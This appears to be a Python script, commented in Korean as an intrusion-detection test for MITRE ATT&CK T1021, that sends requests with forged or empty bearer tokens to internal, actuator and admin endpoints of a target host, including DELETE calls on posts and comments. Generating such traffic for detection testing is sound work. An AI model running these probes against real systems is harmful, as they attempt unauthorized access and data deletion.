"""
MITRE ATT&CK: T1021 - Remote Services (Lateral Movement)
연구 목적 침입 탐지 테스트용 스크립트
사용법: python lateral_movement.py --host http://<TARGET> [--count N]
"""
import argparse
import requests
import time
import logging
import random
import string

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger(__name__)

FORGED_TOKENS = [
    "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9.fake",
    "Bearer internal-service-token-fake",
    "Bearer AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "Bearer null",
    "Bearer undefined",
    "internal-bypass-token",
    "service-mesh-internal",
    "",
]

INTERNAL_ENDPOINTS = [
    ("GET",    "/internal/auth/validate"),
    ("GET",    "/internal/auth/users"),
    ("GET",    "/internal/posts/{id}/exists"),
    ("DELETE", "/internal/posts/{id}/comments"),
    ("GET",    "/internal/posts/all"),
    ("POST",   "/internal/auth/token/refresh"),
    ("GET",    "/actuator/health"),
    ("GET",    "/actuator/env"),
    ("GET",    "/actuator/metrics"),
    ("GET",    "/admin/users"),
    ("DELETE", "/admin/posts/{id}"),
]


def _random_id() -> str:
    return str(random.randint(1, 9999))


def _random_string(length: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=length))


def probe_internal(base_url: str, method: str, path_template: str, token: str) -> None:
    path = path_template.replace("{id}", _random_id())
    url = f"{base_url}{path}"
    headers = {}
    if token:
        headers["Authorization"] = token

    try:
        if method == "GET":
            resp = requests.get(url, headers=headers, timeout=5)
        elif method == "DELETE":
            resp = requests.delete(url, headers=headers, timeout=5)
        elif method == "POST":
            resp = requests.post(url, headers=headers, json={"token": _random_string()}, timeout=5)
        else:
            resp = requests.get(url, headers=headers, timeout=5)

        logger.info(
            "%s %s token=%r status=%d",
            method, path, token[:30] if token else "(없음)", resp.status_code,
        )
    except requests.RequestException as exc:
        logger.error("%s %s 오류 — %s", method, path, exc)


def run(host: str, count: int) -> None:
    base_url = host.rstrip("/")
    logger.info(
        "T1021 Lateral Movement 시작 — 대상: %s, 반복 횟수: %d",
        base_url, count,
    )

    for i in range(count):
        method, path = random.choice(INTERNAL_ENDPOINTS)
        token = random.choice(FORGED_TOKENS)
        probe_internal(base_url, method, path, token)
        time.sleep(0.05)

    logger.info("완료 — 총 %d회 내부 서비스 비인가 접근 시도", count)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="T1021 Lateral Movement 침입 탐지 테스트 스크립트"
    )
    parser.add_argument("--host", required=True, help="대상 호스트 URL (예: http://192.168.1.1)")
    parser.add_argument("--count", type=int, default=50, help="총 시도 횟수 (기본값: 50)")
    args = parser.parse_args()

    run(args.host, args.count)


if __name__ == "__main__":
    main()
